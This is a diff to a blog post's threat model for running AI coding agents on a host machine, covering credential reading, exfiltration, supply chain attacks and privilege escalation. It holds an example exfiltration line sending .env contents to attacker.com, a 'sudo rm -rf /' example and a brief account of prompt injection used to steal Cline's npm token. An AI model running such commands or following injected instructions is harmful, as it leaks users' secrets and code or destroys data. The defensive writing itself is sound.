@@ -28,7 +28,7 @@ Below is the threat model I came up with. The goal isn't to be exhaustive. It's 
 
 | # | Threat | What goes wrong |
 |---|--------|-----------------|
-| T1 | Host filesystem escape | Agent reads files outside the project directory |
+| T1 | Host filesystem access | Agent reads files outside the project directory |
 | T2 | Data exfiltration | Agent sends code or secrets to external endpoints |
 | T3 | Supply chain injection | Compromised package executes on the host |
 | T4 | Credential theft | Agent reads SSH keys, API tokens, cloud credentials |
@@ -37,29 +37,31 @@ Below is the threat model I came up with. The goal isn't to be exhaustive. It's 
 | T7 | Privilege escalation | Agent gains root or elevated capabilities |
 | T8 | Cross-project contamination | Secrets from one project leak into another session |
 
-### T1: Host filesystem escape
+### T1: Host filesystem access
 
-The AI operates on your project directory. But nothing stops it from reading `~/.ssh/`, `~/.aws/credentials`, `~/.env`, or any other file your user account can access. A simple `cat ~/.ssh/id_rsa` is all it takes.
+The AI operates on your project directory. But nothing stops it from reading files anywhere else on your machine. Other projects, personal documents, company files, system configs. Anything your user account can access, the agent can access.
 
-This isn't hypothetical. I've seen agents wander outside the project directory during normal operation, reading system files trying to be helpful. Usually harmless. But if an agent is compromised or hallucinating, that wandering becomes dangerous. There's also the question of training data. Anything the agent reads could end up in future model training unless you've explicitly opted out.
-
-Claude Code's own [sandboxing documentation](https://docs.anthropic.com/en/docs/claude-code/security#sandboxing) acknowledges this: "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys."
+This isn't hypothetical. I've seen agents wander outside the project directory during normal operation, reading system files trying to be helpful. Usually harmless. But if an agent is compromised or hallucinating, that wandering becomes dangerous. You don't want an agent casually reading through your other project directories or your company's internal documentation just because it's curious.
 
 ### T2: Data exfiltration
 
 An agent with network access can send your code anywhere. It could be something obvious like `curl attacker.com -d "$(cat .env)"`, or something subtle buried in a script it generates. You probably wouldn't notice either way.
 
-This is the threat that concerns me most. Source code, API keys, environment variables, git history. All of it is readable by the agent and transmittable over the network. We've already seen this pattern with [malicious VS Code AI extensions that stole source code from 1.5 million installs]({filename}/developer-tools-are-the-new-attack-surface.md). An AI coding agent with network access is the same exfiltration vector, just with more capability.
+This is the threat that concerns me most. Source code, API keys, environment variables, git history. All of it is readable by the agent and transmittable over the network.
+
+We've already seen this pattern in the news where [malicious VS Code AI extensions stole source code from 1.5 million installs]({filename}/developer-tools-are-the-new-attack-surface.md). An AI coding agent with network access is the same exfiltration vector, just with more reasoning capability.
 
 ### T3: Supply chain injection
 
-When an agent runs `npm install` or `pip install`, it pulls packages from public registries. If one of those packages is compromised, the malicious code executes with the agent's permissions on your host. The agent didn't do anything wrong. It just installed what you asked for, and the supply chain was already poisoned.
+When an agent runs `npm install` or `pip install`, it pulls packages from public registries. If one of those packages is compromised, the malicious code executes with the agent's permissions on your host. This isn't unique to AI agents, but agents make it worse because they install packages autonomously without you reviewing each one.
 
-This already happened. A [supply chain attack on Cline CLI]({filename}/your-ai-assistant-might-be-working-for-someone-else.md) compromised the npm publish token and installed autonomous AI agents on roughly 4,000 developer machines. The attacker used prompt injection against Cline's own AI issue triage to steal the token. A [trojanized MCP server]({filename}/your-ai-assistant-might-be-working-for-someone-else.md) deploying the StealC infostealer was another recent one.
+This already happened. A [supply chain attack on Cline CLI]({filename}/your-ai-assistant-might-be-working-for-someone-else.md) compromised the npm publish token and installed autonomous AI agents on roughly 4,000 developer machines. The attacker used prompt injection against Cline's own AI issue triage to steal the token.
 
 ### T4: Credential theft
 
 SSH keys, API tokens, cloud credentials, browser cookies. Your home directory is full of secrets. An agent running on your host can read all of them. Even if the agent itself is trustworthy, a compromised skill or MCP server it loads might not be. Infostealers are already [targeting AI agent configuration files and gateway tokens]({filename}/your-ai-assistant-might-be-working-for-someone-else.md) specifically.
+
+Claude Code's own [sandboxing documentation](https://docs.anthropic.com/en/docs/claude-code/security#sandboxing) acknowledges this: "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys."
 
 ### T5: Lateral movement
 
@@ -71,11 +73,11 @@ A compromised session could modify the agent's own configuration to persist acro
 
 ### T7: Privilege escalation
 
-If the agent can run `sudo`, the non-root user boundary means nothing. Even without explicit sudo access, there are setuid binaries and other escalation paths on most systems.
+If the agent can run `sudo`, the non-root user boundary means nothing. And it's easier to end up there than you'd think. Claude Code scopes permissions to specific command patterns, so approving `sudo apt install curl` doesn't automatically approve `sudo rm -rf /`. But hit "Allow for session" and every `sudo` that matches the pattern goes through without a prompt for the rest of the session. Hit "Don't ask again" and it's written to `settings.local.json` permanently. One careless click with a broad pattern and you've handed the agent root.
 
 ### T8: Cross-project contamination
 
-If you're working on multiple projects, credentials from one project session shouldn't be accessible in another. But without isolation, they share the same home directory, the same SSH keys, the same environment variables.
+If you're working on multiple projects, credentials from one project session shouldn't be accessible in another. But without isolation, they share the same home directory, the same SSH keys, the same environment variables. If you're doing client work, this is a confidentiality problem. An agent working on your personal project can read the `.env` from a client project sitting in the next directory over.
 
 ## What Claudecker protects against
 
